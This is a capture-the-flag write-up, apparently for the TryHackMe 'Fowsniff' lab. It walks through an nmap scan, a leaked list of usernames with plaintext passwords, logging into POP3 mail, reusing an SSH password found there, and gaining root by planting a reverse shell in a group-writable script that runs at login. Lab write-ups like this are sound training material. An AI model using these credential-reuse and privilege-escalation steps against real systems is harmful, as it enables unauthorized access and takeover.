https://tryhackme.com/r/room/ctf
current ip 10.10.219.166

##### Osint
Twitter: https://twitter.com/fowsniffcorp?lang=fr
Leak: https://raw.githubusercontent.com/berzerk0/Fowsniff/main/fowsniff.txt
##### Nmap scan
`nmap -A -p- -sV ctf.thm` 

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-11 15:17 CEST
Nmap scan report for ctf.thm (10.10.238.25)
Host is up (0.054s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Fowsniff Corp - Delivering Solutions
| http-robots.txt: 1 disallowed entry 
|_/
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: SASL(PLAIN) RESP-CODES USER TOP PIPELINING CAPA UIDL AUTH-RESP-CODE
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: ENABLE LOGIN-REFERRALS OK ID listed more AUTH=PLAINA0001 capabilities SASL-IR have post-login Pre-login LITERAL+ IDLE IMAP4rev1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.76 seconds
```

##### User leaked
mauer@fowsniff:mailcall
mustikka@fowsniff:bilbo101
tegel@fowsniff:apples01
baksteen@fowsniff:skyler22
seina@fowsniff:scoobydoo2
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:carp4ever
parede@fowsniff:orlando12
sciana@fowsniff:07011972

##### POP3 connection via telnet
`telnet ctf.thm 110` 
`USER seina` 
`PASS scoobydoo2` 
`LIST` : list emails
`RETR id` : show the message

##### Seina message 1
```
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone
```
##### Seina message 2
```
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.
```

##### SSH connection
`ssh baksteen@10.10.219.166` with **S1ck3nBluff+secureshell** password
`groups` to see baksteen groups, **users** seems to be an additionnal group
`cat /etc/group | grep users` to see the **users** group id (100)
`find / -group 100 2> /dev/null` find file owned by **users** group => /opt/cube/cube.sh

![[Screenshot_2024-04-12_11-09-28.png]]

Seina in users group can write and execute `cube.sh` so if another file is executing `cube.sh` as sudo, we could be root

`find /etc/ -type f -exec grep "cube.sh" {} + 2>/dev/null`
Response:
![[Screenshot_2024-04-12_11-35-14.png]]

![[Screenshot_2024-04-12_11-36-13.png]]

00-header is executed as root, let's put a reverse shell in cube.sh to be executed as root when a user is connecting
![[Screenshot_2024-04-12_11-38-31.png]]

gg